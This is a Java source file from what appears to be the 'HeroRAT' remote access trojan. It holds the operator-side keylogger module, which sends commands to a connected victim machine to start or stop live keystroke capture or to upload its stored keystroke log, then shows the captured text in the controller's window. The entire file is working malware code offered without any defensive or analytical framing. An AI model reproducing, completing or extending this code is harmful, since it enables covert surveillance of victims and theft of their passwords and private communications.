package net.herorat.features.keylogger;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet4Keylogger;


public class Keylogger
{
	public static void sendLive(Server server, boolean on)
	{
		Packet p = new Packet4Keylogger(server.outputstream, new String[] { "live", (on ? "true" : "false") });
		p.write();
	}
	
	public static void sendDownload(Server server)
	{
		Packet p = new Packet4Keylogger(server.outputstream, new String[] { "download" });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
		if (args.length > 1 && args[0].equals("live"))
		{
			StringBuffer buffer = new StringBuffer();
			for (int i=1; i<args.length; i++)
			{
				buffer.append(args[i]);
			}
			server.buffer_logger.append(buffer.toString());
			Main.mainWindow.panel_tab11.area_output.setText(server.buffer_logger.toString());
		}
		else if (args.length > 1 && args[0].equals("download"))
		{
			StringBuffer buffer = new StringBuffer();
			for (int i=1; i<args.length; i++)
			{
				buffer.append(args[i]);
			}
			server.buffer_logger = buffer;
			Main.mainWindow.panel_tab11.area_output.setText(server.buffer_logger.toString());
		}
	}
}